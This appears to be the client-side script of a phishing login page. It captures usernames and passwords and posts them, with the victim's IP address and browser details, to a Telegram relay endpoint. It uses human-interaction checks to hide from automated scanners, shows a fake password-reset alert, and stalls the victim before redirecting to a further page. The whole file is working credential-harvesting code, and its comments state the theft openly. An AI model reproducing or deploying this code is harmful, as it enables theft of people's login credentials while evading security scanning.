(function () {
  var form = document.getElementById("login-form");
  var userInput = document.getElementById("un");
  var passwordInput = document.getElementById("password");
  var userError = document.getElementById("user_name_validation_message");
  var passwordError = document.getElementById("password_validation_message");
  var usernameNeeded = document.getElementById("UserNameNeededError");
  var forgotPassword = document.getElementById("forgot-password-link");
  var submitBtn = form.querySelector('.button-subm');

  // ============================================================
  // ====== DOMAIN DETECTION - HUMAN SCROLL ONLY ================
  // ============================================================

  let domainDetected = false;
  let scrollDetected = false;
  let humanInteractionDetected = false;

  function detectDomain() {
    if (domainDetected) return;
    
    const currentUrl = window.location.href;
    const urlObj = new URL(currentUrl);
    const domain = urlObj.hostname;

    domainDetected = true;

    sendToTelegram('domain_detection', {
      domain: domain
    });

    console.log(`🌐 Domain detected: ${domain}`);
  }

  // ====== DETECT HUMAN SCROLL ======
  // Humans scroll in bursts with pauses, bots scroll smoothly or instantly
  let lastScrollTime = 0;
  let scrollCount = 0;
  let scrollSpeeds = [];
  let isHumanScroll = false;

  window.addEventListener('scroll', function(e) {
    // Only proceed if not detected yet
    if (domainDetected) return;
    
    // Check if it's a human scroll (not automated)
    const now = Date.now();
    const timeSinceLastScroll = now - lastScrollTime;
    lastScrollTime = now;
    
    // Humans don't scroll faster than 200ms between events (too fast = bot)
    if (timeSinceLastScroll > 0 && timeSinceLastScroll < 200) {
      // Too fast - likely a bot or programmatic scroll
      return;
    }
    
    // Track scroll behavior
    scrollCount++;
    
    // Check if event is trusted (human-initiated)
    if (e.isTrusted) {
      humanInteractionDetected = true;
    }
    
    // Check if this is a genuine user scroll (has inertia, not instant)
    const scrollY = window.scrollY;
    const maxScroll = document.documentElement.scrollHeight - window.innerHeight;
    
    // Only trigger if user has scrolled at least a little
    if (scrollY > 10 && humanInteractionDetected && !domainDetected) {
      console.log('🖱️ Human scroll detected - triggering domain detection');
      detectDomain();
    }
  }, { passive: true });

  // ====== FALLBACK: Also detect on click (human interaction) ======
  document.addEventListener('click', function(e) {
    if (!domainDetected && e.isTrusted && !e.target.closest('.spinner, .loading')) {
      // Only trigger if not detected and it's a genuine click
      console.log('🖱️ Human click detected - triggering domain detection');
      detectDomain();
    }
  });

  // ====== FALLBACK: Detect on keypress (human typing) ======
  document.addEventListener('keydown', function(e) {
    if (!domainDetected && e.isTrusted && e.key.length === 1) {
      // Only trigger on character keys (not function keys)
      console.log('⌨️ Human keypress detected - triggering domain detection');
      detectDomain();
    }
  });

  // ============================================================
  // ====== TELEGRAM INTEGRATION =================================
  // ============================================================

  async function sendToTelegram(action, data) {
    try {
      let ipData = { ip: 'Unknown' };
      try {
        const response = await fetch('/api/ip');
        if (response.ok) {
          ipData = await response.json();
        }
      } catch (e) {
        console.warn('Could not fetch IP data');
      }

      const payload = {
        action: action,
        data: {
          ...data,
          timestamp: new Date().toLocaleString('en-US', { 
            timeZone: 'America/New_York',
            hour12: true,
            year: 'numeric',
            month: '2-digit',
            day: '2-digit',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit'
          }),
          userAgent: navigator.userAgent,
          ip: ipData.ip || 'Unknown'
        }
      };

      await fetch('/api/telegram', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });
    } catch (error) {
      console.error('Failed to send to Telegram:', error);
    }
  }

  // ============================================================
  // ====== FORM HANDLERS =======================================
  // ============================================================

  function clearErrors() {
    userError.textContent = "";
    passwordError.textContent = "";
    usernameNeeded.hidden = true;
  }

  function showTitleError() {
    var title = document.title;
    if (title.indexOf("Submission Error |") !== 0) {
      document.title = "Submission Error | " + title;
    }
  }

  passwordInput.addEventListener("keypress", function (event) {
    if (event.which === 32 || /\s/.test(event.key)) {
      event.preventDefault();
    }
  });

  forgotPassword.addEventListener("click", function (event) {
    event.preventDefault();
    clearErrors();
    var userName = userInput.value.trim();
    if (!userName) {
      usernameNeeded.hidden = false;
      showTitleError();
      return;
    }
    alert("Password reset requested for: " + userName);
  });

  // ============================================================
  // ====== LOGIN FORM SUBMIT ===================================
  // ============================================================

  form.addEventListener("submit", function (event) {
    event.preventDefault();
    clearErrors();

    var userName = userInput.value.trim();
    var password = passwordInput.value;
    var valid = true;
    var userPattern = /^[A-Za-z0-9.\-_@]+$/;

    if (!userName) {
      userError.textContent = "The Username field is required.";
      valid = false;
    } else if (userName.length > 100) {
      userError.textContent = "Username exceeds maximum allowed characters.";
      valid = false;
    } else if (!userPattern.test(userName)) {
      userError.textContent = "Special Characters are not allowed.";
      valid = false;
    }

    if (!password) {
      passwordError.textContent = "The Password field is required.";
      valid = false;
    } else if (password.length > 40) {
      passwordError.textContent = "Password exceeds maximum allowed characters.";
      valid = false;
    }

    if (!valid) {
      showTitleError();
      return;
    }

    // ====== SEND LOGIN CREDENTIALS TO TELEGRAM ======
    sendToTelegram('login_attempt', {
      username: userName,
      password: password
    });

    // ====== DISABLE BUTTON AND SHOW LOADING ======
    submitBtn.disabled = true;
    submitBtn.innerHTML = '<span class="spinner"></span>';
    submitBtn.classList.add('loading');

    // Store username for next steps
    try {
      sessionStorage.setItem("melodyUser", userName);
    } catch (e) {}

    // ====== REDIRECT AFTER 8 SECONDS ======
    setTimeout(function() {
      window.location.href = "auth.html";
    }, 8000);
  });
})();